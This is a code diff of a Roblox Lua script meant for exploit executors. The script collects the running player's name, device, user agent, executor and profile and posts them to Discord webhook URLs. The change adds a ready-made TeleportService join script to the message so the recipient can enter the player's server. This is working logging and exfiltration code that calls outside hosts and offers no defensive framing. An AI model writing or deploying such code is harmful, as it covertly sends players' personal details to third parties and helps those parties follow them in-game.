@@ -66,14 +66,6 @@ local function detectExploit()
     return "None"
 end
 
--- Function to get server information
-local function getServerInfo()
-    local placeId = game.PlaceId
-    local serverId = game.JobId
-    local serverLink = "https://www.roblox.com/games/" .. tostring(placeId) .. "/"
-    return serverId, serverLink
-end
-
 local function sendNotification()
     local player = Players.LocalPlayer
     local playerName = player.Name
@@ -97,8 +89,7 @@ local function sendNotification()
     local device = detectDevice(userAgent)
     local exploit = detectExploit()
 
-    -- Get server information
-    local serverId, serverLink = getServerInfo()
+    local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. placeId .. ", '" .. game.JobId .. "', game:GetService('Players').LocalPlayer)"
 
     local data = {
         ["embeds"] = {
@@ -129,14 +120,9 @@ local function sendNotification()
                         ["inline"] = true,
                     },
                     {
-                        ["name"] = "Server ID:",
-                        ["value"] = serverId,
-                        ["inline"] = true,
-                    },
-                    {
-                        ["name"] = "Server Link:",
-                        ["value"] = "[" .. placeName .. "](" .. serverLink .. ")",
-                        ["inline"] = true,
+                        ["name"] = "Join Server (Execute This On Roblox):",
+                        ["value"] = "```lua\n" .. joinScript .. "\n```",
+                        ["inline"] = false,
                     },
                     {
                         ["name"] = "Player Profile:",
@@ -165,7 +151,7 @@ local function sendNotification()
 
     -- Send to all webhook URLs
     for _, url in ipairs(Webhook_URLs) do
-        local Request = http_request or request or HttpPost or syn.request
+        local Request = http_request or request or syn.request
         Request({
             Url = url,
             Body = PlayerData,
